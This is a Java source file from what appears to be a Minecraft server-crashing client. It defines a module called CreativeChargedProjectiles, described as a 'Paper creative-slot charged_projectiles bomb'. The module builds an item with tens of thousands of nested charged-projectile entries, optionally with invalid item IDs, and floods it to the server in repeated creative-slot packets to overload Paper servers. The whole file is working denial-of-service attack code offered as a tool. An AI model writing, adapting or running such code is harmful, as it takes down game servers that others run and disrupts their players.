package me.dannycrasher.client.module.impl.paper;

import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.ScheduledExecutorService;
import me.dannycrasher.client.command.ArgumentType;
import me.dannycrasher.client.module.Module;
import me.dannycrasher.client.module.ModuleContext;
import me.dannycrasher.client.module.ModuleType;
import me.dannycrasher.client.protocol.components.data.DataComponents;
import me.dannycrasher.client.protocol.components.data.impl.DataChargedProjectiles;
import me.dannycrasher.client.protocol.components.objects.ItemStack;

public class CreativeChargedProjectiles extends Module {
	private ScheduledExecutorService executorService;

	public CreativeChargedProjectiles() {
		super("CreativeChargedProjectiles", "Paper creative-slot charged_projectiles bomb (requires creative)", ModuleType.PAPER);
		addArgument("packets", ArgumentType.INT, 1, 1000, "50");
		addArgument("size 1", ArgumentType.INT, 1, 2096000, "65536");
		addArgument("size 2", ArgumentType.INT, 1, 2096000, "1");
		addArgument("isIllegal", ArgumentType.BOOLEAN);
		addArgument("slot", ArgumentType.INT, 0, 45, "36");
		addArgument("threadSleep", ArgumentType.INT, 1, 5000, "1000");
		addArgument("loopAmount", ArgumentType.INT, 1, 5000, "5");
	}

	@Override
	public void executeModule(ModuleContext context) {
		int packets = context.getInt("packets");
		int chargedProjectiles1 = context.getInt("size 1");
		int chargedProjectiles2 = context.getInt("size 2");
		boolean isIllegal = context.getBoolean("isIllegal");
		int slot = context.getInt("slot");
		int threadSleep = context.getInt("threadSleep");
		int loopAmount = context.getInt("loopAmount");

		List<ItemStack> chargedProjectiles = new ArrayList<>(chargedProjectiles1);
		ItemStack chargedProjectile = new ItemStack(isIllegal ? -1 : 1, 1, null);
		for (int i = 0; i < chargedProjectiles1; ++i) {
			chargedProjectiles.add(chargedProjectile);
		}

		DataComponents inner = new DataComponents();
		inner.put(new DataChargedProjectiles(chargedProjectiles));
		ItemStack stack1 = new ItemStack(isIllegal ? -1 : 1233, 1, inner);

		List<ItemStack> outerList = new ArrayList<>(chargedProjectiles2);
		for (int i = 0; i < chargedProjectiles2; ++i) {
			outerList.add(stack1);
		}

		DataComponents outer = new DataComponents();
		outer.put(new DataChargedProjectiles(outerList));
		ItemStack item = new ItemStack(isIllegal ? -1 : 1233, 1, outer);

		executorService = CreativeAttackHelper.start(this, context, executorService, packets, threadSleep, loopAmount, slot, item);
	}

	@Override
	public void onDisconnect() {
		super.onDisconnect();
		CreativeAttackHelper.shutdown(executorService);
	}
}
